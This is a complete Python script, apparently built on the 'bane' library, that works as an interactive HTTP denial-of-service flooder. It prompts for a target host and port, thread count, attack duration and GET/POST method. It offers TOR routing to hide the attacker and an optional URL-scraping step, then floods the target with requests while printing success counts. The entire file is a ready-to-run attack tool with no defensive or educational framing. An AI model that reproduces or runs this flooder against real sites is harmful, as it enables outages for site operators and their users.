import bane, sys, socket, time

if sys.version_info < (3, 0):
    input = raw_input

def get_input(prompt, validation_func, error_msg):
    while True:
        try:
            value = input(prompt)
            if validation_func(value):
                return value
        except:
            pass
        print(error_msg)

target = get_input(
    bane.Fore.GREEN + '\nIP / Domain: ' + bane.Fore.WHITE,
    lambda x: socket.gethostbyname(x),
    bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
)

port = int(get_input(
    bane.Fore.GREEN + '\nPort ( number between 1 - 65565 ) : ' + bane.Fore.WHITE,
    lambda x: 0 < int(x) < 65566,
    bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
))

threads = int(get_input(
    bane.Fore.GREEN + '\nThreads ( number between 1 - 1024 ) : ' + bane.Fore.WHITE,
    lambda x: 0 < int(x) < 1025,
    bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
))

timeout = int(get_input(
    bane.Fore.GREEN + '\nTimeout ( number between 1 - 100 ) : ' + bane.Fore.WHITE,
    lambda x: 0 < int(x) < 101,
    bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
))

duration = int(get_input(
    bane.Fore.GREEN + '\nAttack duration in seconds ( number between 1 - 1000000 ) : ' + bane.Fore.WHITE,
    lambda x: 0 < int(x) < 1000001,
    bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
))

tor = get_input(
    bane.Fore.GREEN + '\nTOR enabled? ( yes / no ) : ' + bane.Fore.WHITE,
    lambda x: x.lower() in ['n', 'y', 'yes', 'no'],
    bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
).lower() in ['y', 'yes']

method = int(get_input(
    bane.Fore.GREEN + '\nAttack method: \n\t1- GET \n\t2- POST \n\t3- GET + POST\n=>' + bane.Fore.WHITE,
    lambda x: int(x) in [1, 2, 3],
    bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
))

spam_mode = get_input(
    bane.Fore.GREEN + '\n"spam" mode? ( yes / no ) : ' + bane.Fore.WHITE,
    lambda x: x.lower() in ['n', 'y', 'yes', 'no'],
    bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
).lower() in ['y', 'yes']

if spam_mode:
    http_flooder_instance = bane.HTTP_Spam(target, p=port, timeout=timeout, threads=threads, duration=duration, tor=tor, logs=False, method=method)
else:
    target = f"https://{target}/" if port == 443 else f"http://{target}:{port}/"
    scrape_target = get_input(
        bane.Fore.GREEN + '\nDo you want to scrape the target? ( yes / no ) : ' + bane.Fore.WHITE,
        lambda x: x.lower() in ['n', 'y', 'yes', 'no'],
        bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
    ).lower() in ['y', 'yes']
    
    scraped_urls = 1
    if scrape_target:
        scraped_urls = int(get_input(
            bane.Fore.GREEN + '\nHow many URLs to collect? ( between 1 - 20 ) : ' + bane.Fore.WHITE,
            lambda x: 0 < int(x) < 21,
            bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
        ))
    
    http_flooder_instance = bane.HTTP_Puncher(target, timeout=timeout, threads=threads, duration=duration, tor=tor, logs=False, method=method, scrape_target=scrape_target, scraped_urls=scraped_urls)

print(bane.Fore.RESET)

while True:
    try:
        time.sleep(1)
        sys.stdout.write("\r{}Total: {} {}| {}success => {} {}| {}Fails => {}{}".format(
            bane.Fore.BLUE,
            http_flooder_instance.counter + http_flooder_instance.fails,
            bane.Fore.WHITE,
            bane.Fore.GREEN,
            http_flooder_instance.counter,
            bane.Fore.WHITE,
            bane.Fore.RED,
            http_flooder_instance.fails,
            bane.Fore.RESET
        ))
        sys.stdout.flush()
        if http_flooder_instance.done():
            break
    except:
        break
